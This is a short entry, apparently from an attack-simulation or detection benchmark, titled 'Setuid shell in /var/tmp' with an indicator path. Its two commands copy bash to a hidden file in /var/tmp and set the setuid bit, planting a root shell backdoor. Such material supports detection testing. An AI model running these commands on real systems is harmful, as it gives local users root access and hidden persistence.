# category: privilege
# title: Setuid shell in /var/tmp
# indicator: /var/tmp/.bench-sh
cp /bin/bash /var/tmp/.bench-sh
chmod 4755 /var/tmp/.bench-sh
